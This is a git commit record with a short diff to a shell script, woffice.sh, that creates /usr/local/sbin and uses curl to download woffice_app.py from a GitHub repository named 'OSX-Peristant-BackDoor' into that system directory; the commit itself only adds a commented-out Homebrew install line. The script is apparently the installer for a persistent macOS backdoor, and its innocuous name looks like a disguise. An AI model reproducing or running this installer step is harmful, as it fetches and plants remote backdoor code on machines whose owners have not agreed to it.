8b92ab713b953796b637664471e327fda5d9241e
Davide Pistacchio <davidepistacchio@Davides-Mac.fritz.box>
2019-03-02 06:06:47 -0800

    ok

--- woffice.sh
+++ woffice.sh
@@ -1,4 +1,5 @@
 #!/bin/sh
+#ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
 mkdir /usr/local/sbin
 curl https://raw.githubusercontent.com/pistacchietto/OSX-Peristant-BackDoor/master/woffice_app.py  -o /usr/local/sbin/woffice_app.py
 #chmod 777 /usr/local/sbin/woffice_app.py
